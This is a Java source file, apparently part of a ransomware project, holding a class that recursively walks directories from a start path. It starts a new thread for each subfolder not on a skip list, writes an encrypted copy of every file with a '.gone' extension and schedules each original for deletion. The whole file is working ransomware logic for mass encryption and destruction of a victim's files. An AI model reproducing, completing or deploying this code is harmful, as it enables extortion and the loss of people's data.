package aluka.core;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.function.Supplier;

public class FileDeeperBrowser implements Runnable {

	public final static int TAMPON = 117;

	private EncryptionManager encryption;
	private String startPath;
	private Supplier<List<String>> callback;

	public FileDeeperBrowser(EncryptionManager encryption, String startPath, Supplier<List<String>> callback) {
		this.encryption = encryption;
		this.startPath = startPath;
		this.callback = callback;
	}

	public void encryptFilesInsidePath() {
		List<String> avoidPaths = callback.get();
		File file = new File(startPath);
		for (File fileObject : file.listFiles()) {
			if (fileObject.isDirectory()) {
				if (!avoidPaths.contains(fileObject.getName().toUpperCase())) {
					Thread anotherDirectory = new Thread(new FileDeeperBrowser(encryption, fileObject.getAbsolutePath(), callback));
					anotherDirectory.start();
				}
			} else {
				encryptFile(fileObject);
			}
		}
	}

	private void encryptFile(File file) {
		try {
			File encryptedFile = new File(file.getParentFile().getAbsolutePath() + "\\" + file.getName() + ".gone");
			BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
			BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(encryptedFile));
			byte[] tampon = new byte[TAMPON];
			while (bis.read(tampon) > 0) {
				String encryptedString = this.encryption.encryptByte(tampon);
				bos.write(encryptedString.getBytes());
			}
			bos.close();
			bis.close();
			file.deleteOnExit();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	@Override
	public void run() {
		this.encryptFilesInsidePath();
	}
}
